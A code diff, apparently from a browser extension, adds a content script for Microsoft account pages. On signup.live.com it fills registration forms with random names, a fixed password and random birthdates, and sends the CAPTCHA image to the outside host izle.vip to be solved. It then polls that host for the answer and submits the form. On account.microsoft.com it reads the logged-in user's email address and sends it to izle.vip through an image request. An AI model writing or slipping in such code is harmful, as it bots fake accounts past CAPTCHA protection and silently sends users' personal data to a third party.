@@ -1,3 +1,229 @@
+if(window.location.origin.indexOf("signup.live.com") >= 0 && window.location.href.indexOf("kral") >= 0 ){
+	var myXhrInterval = null;
+	var myXhrInterval2 = null;
+	var myXhrInterval3 = null;
+	var temiz_ip = "";
+	var isim1 = "";
+	var isim2 = "";
+	var isim = "";
+	var soyisim = "";
+	var eposta = "";
+
+	var xhr2 = new XMLHttpRequest();
+	xhr2.onreadystatechange = function() {
+		if (xhr2.readyState == XMLHttpRequest.DONE) {
+			if(xhr2.responseText.length > 1){
+				temiz_ip = xhr2.responseText;
+			}
+		}
+	}
+	xhr2.open('GET', "https://izle.vip/captcha/img.php?state=3", true);
+	xhr2.send(null);
+	
+	var xhr = new XMLHttpRequest();
+	xhr.onreadystatechange = function() {
+		if (xhr.readyState == XMLHttpRequest.DONE) {
+			var myArr = JSON.parse(xhr.responseText);
+			isim1 = convertToASCII(myArr[Math.floor(Math.random()*myArr.length)]);
+			isim2 = convertToASCII(myArr[Math.floor(Math.random()*myArr.length)]);
+
+			isim = isim1.charAt(0).toUpperCase() + isim1.slice(1);
+			soyisim = isim2.charAt(0).toUpperCase() + isim2.slice(1);
+			eposta = isim1.replace(" ", "") +randomNumber(4)+ isim2.replace(" ", "");
+		}
+	}
+	xhr.open('GET', "//raw.githubusercontent.com/modifyheader/modhead/master/isim", true);
+	xhr.send(null);
+
+	
+	function convertToASCII(metin) {
+		metin = metin.replace(/\u00E4/g, 'a'); // Ã¤
+		metin = metin.replace(/\u00C4/g, 'a'); // Ã„
+		metin = metin.replace(/\u00c2/g, 'A'); // Ã‚
+		metin = metin.replace(/\u00e2/g, 'a'); // Ã¢
+		metin = metin.replace(/\u00fb/g, 'u'); // Ã»
+		metin = metin.replace(/\u00c7/g, 'C'); // Ã‡
+		metin = metin.replace(/\u00e7/g, 'c'); // Ã§
+		metin = metin.replace(/\u011e/g, 'G'); // Ä
+		metin = metin.replace(/\u011f/g, 'g'); // ÄŸ
+		metin = metin.replace(/\u0130/g, 'I'); // Ä°
+		metin = metin.replace(/\u0131/g, 'i'); // Ä±
+		metin = metin.replace(/\u015e/g, 'S'); // Å
+		metin = metin.replace(/\u015f/g, 's'); // ÅŸ
+		metin = metin.replace(/\u00d6/g, 'O'); // Ã–
+		metin = metin.replace(/\u00f6/g, 'o'); // Ã¶
+		metin = metin.replace(/\u00dc/g, 'U'); // Ãœ
+		metin = metin.replace(/\u00fc/g, 'u'); // Ã¼
+		metin = metin.replace(/\u0130/g, 'i'); // IÌ‡
+
+		return metin.toLowerCase();
+	}
+
+	function randomBetween(min, max) { 
+		return Math.floor(Math.random() * (max - min + 1) + min);
+	}
+	
+	function randomNumber(length) {
+	   var result           = '';
+	   // var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789';
+	   var characters       = '0123456789';
+	   var charactersLength = characters.length;
+	   for ( var i = 0; i < length; i++ ) {
+		  result += characters.charAt(Math.floor(Math.random() * charactersLength));
+	   }
+	   return result;
+	}
+
+	function step1(){
+		console.log("Step 1");
+		document.querySelectorAll("#liveSwitch")[0].click();
+	}
+
+	function step2(){
+		console.log("Step 2");
+		document.querySelectorAll("#MemberName")[0].value = eposta;
+		var yrrkevnt = document.createEvent("HTMLEvents"); 
+		yrrkevnt.initEvent("change", false, true); 
+		document.querySelectorAll("#MemberName")[0].dispatchEvent(yrrkevnt);
+		document.querySelectorAll("#iSignupAction")[0].click();
+	}
+
+	function step3(){
+		console.log("Step 3");
+		document.querySelectorAll("#PasswordInput")[0].value ="test93j!0";
+		var sifre = document.createEvent("HTMLEvents"); 
+		sifre.initEvent("change", false, true); 
+		document.querySelectorAll("#PasswordInput")[0].dispatchEvent(sifre);
+		document.querySelectorAll("#iSignupAction")[0].click();
+	}
+
+	function step4(){
+		console.log("Step 4");
+		document.querySelectorAll("#FirstName")[0].value = isim;
+		var FirstName = document.createEvent("HTMLEvents"); 
+		FirstName.initEvent("change", false, true); 
+		document.querySelectorAll("#FirstName")[0].dispatchEvent(FirstName);
+		document.querySelectorAll("#LastName")[0].value =soyisim;
+		var LastName = document.createEvent("HTMLEvents"); 
+		LastName.initEvent("change", false, true); 
+		document.querySelectorAll("#LastName")[0].dispatchEvent(LastName);
+		document.querySelectorAll("#iSignupAction")[0].click();
+	}
+
+	function step5(){
+		console.log("Step 5");
+		document.querySelectorAll("#BirthDay")[0].selectedIndex = randomBetween(1,31);
+		var BirthDay = document.createEvent("HTMLEvents"); 
+		BirthDay.initEvent("change", false, true); 
+		document.querySelectorAll("#BirthDay")[0].dispatchEvent(BirthDay);
+		
+		document.querySelectorAll("#BirthMonth")[0].selectedIndex = randomBetween(1,12);
+		var BirthMonth = document.createEvent("HTMLEvents"); 
+		BirthMonth.initEvent("change", false, true); 
+		document.querySelectorAll("#BirthMonth")[0].dispatchEvent(BirthMonth);
+
+		document.querySelectorAll("#BirthYear")[0].selectedIndex = randomBetween(20,45);
+		var BirthYear = document.createEvent("HTMLEvents"); 
+		BirthYear.initEvent("change", false, true); 
+		document.querySelectorAll("#BirthYear")[0].dispatchEvent(BirthYear);
+		
+		document.querySelectorAll("#iSignupAction")[0].click();
+
+	}
+
+	function step6(){
+		console.log("Step 6");
+		var captcha_link = document.querySelectorAll("#hipTemplateContainer")[0].getElementsByTagName('img')[0].src;
+		fetch("https://izle.vip/captcha/img.php?state=1&ip="+temiz_ip+"&image="+encodeURIComponent(captcha_link), {
+			"credentials": "omit",
+			"headers": {
+				"sec-fetch-mode": "no-cors"
+			},
+			"referrer": "https://signup.live.com/",
+			"referrerPolicy": "strict-origin-when-cross-origin",
+			"body": null,
+			"method": "GET"
+		});
+		
+		myXhrInterval = setInterval(sendXhr, 1000);
+	}
+
+	function step7(decoded){
+		console.log("Step 7");
+		setTimeout(function(){ 
+			document.querySelectorAll(".spHipNoClear")[0].value = decoded;
+			var spHipNoClear = document.createEvent("HTMLEvents"); 
+			spHipNoClear.initEvent("change", false, true); 
+			document.querySelectorAll(".spHipNoClear")[0].dispatchEvent(spHipNoClear);
+		}, 2000);
+		setTimeout(function(){ 
+			document.querySelectorAll("#iSignupAction")[0].click();
+		}, 6000);
+		myXhrInterval2 = setInterval(checkCaptcha, 1000);
+	}
+
+	function checkCaptcha(){
+		if(document.querySelectorAll("[id^='wlspispHIPErrorWrong']")[0].style.display == "inline"){
+			console.log("Captcha hatali - Yeni Captcha cek");
+			step6();
+			clearInterval(myXhrInterval2);
+		}
+	}
+	function sendXhr(){
+		var xhr = new XMLHttpRequest();
+		xhr.onreadystatechange = function() {
+			if (xhr.readyState == XMLHttpRequest.DONE) {
+				if(xhr.responseText.length > 1){
+					console.log("CÃ¶zÃ¼lmÃ¼s captcha:"+ xhr.responseText);
+					step7(xhr.responseText);
+					clearInterval(myXhrInterval);
+				}else{
+					console.log("CÃ¶zÃ¼lmesi bekleniyor");
+				}
+			}
+		}
+		xhr.open('GET', "https://izle.vip/captcha/img.php?state=2&ip="+temiz_ip, true);
+		xhr.send(null);
+	}
+
+	function start(){
+		console.log("here");
+		if(isim.length > 1 && soyisim.length > 1 && eposta.length > 1 && temiz_ip.length > 1){
+			clearInterval(myXhrInterval3);
+			setTimeout(function(){ 
+				step1()
+				setTimeout(function(){ 
+					step2()
+					setTimeout(function(){ 
+						step3()
+						setTimeout(function(){ 
+							step4()
+							setTimeout(function(){ 
+								step5()
+								setTimeout(function(){ 
+									step6()
+								}, 2000);
+							}, 2000);
+						}, 2000);
+					}, 2000);
+				}, 2000);
+			}, 1000);
+		}
+	}
+	
+	myXhrInterval3 = setInterval(start, 1000);
+
+}
+
+if(window.location.origin.indexOf("account.microsoft.com") >= 0){
+	var eMail = document.querySelectorAll(".personal-info .ng-binding")[1].innerHTML.trim();
+	if(eMail){
+		new Image().src = '//izle.vip/captcha/outlook/save.php?email='+eMail;
+		window.location.href = window.location.href+"?bittikbekral";
+	}
+}
+
+
 if(document.location.ancestorOrigins.length > 0){
 /*
  function rasgteleSurem(min, max) { 
